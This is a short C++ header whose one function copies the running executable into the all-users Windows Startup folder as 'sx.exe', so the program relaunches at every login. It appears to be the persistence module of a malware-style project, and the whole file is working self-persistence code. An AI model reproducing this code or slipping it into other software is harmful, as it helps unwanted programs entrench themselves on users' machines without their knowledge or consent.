#ifndef COPY_TO_STARTUP_FOLDER_H
#define COPY_TO_STARTUP_FOLDER_H

#include <iostream>
#include <Windows.h>

void CopyToStartupFolder() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);

    const wchar_t* destinationPath = L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\sx.exe";

    if (CopyFileW(exePath, destinationPath, FALSE)) {
        std::cout << "File copied successfully." << std::endl;
    } else {
        std::cerr << "Error copying file: " << GetLastError() << std::endl;
    }
}

#endif // COPY_TO_STARTUP_FOLDER_H
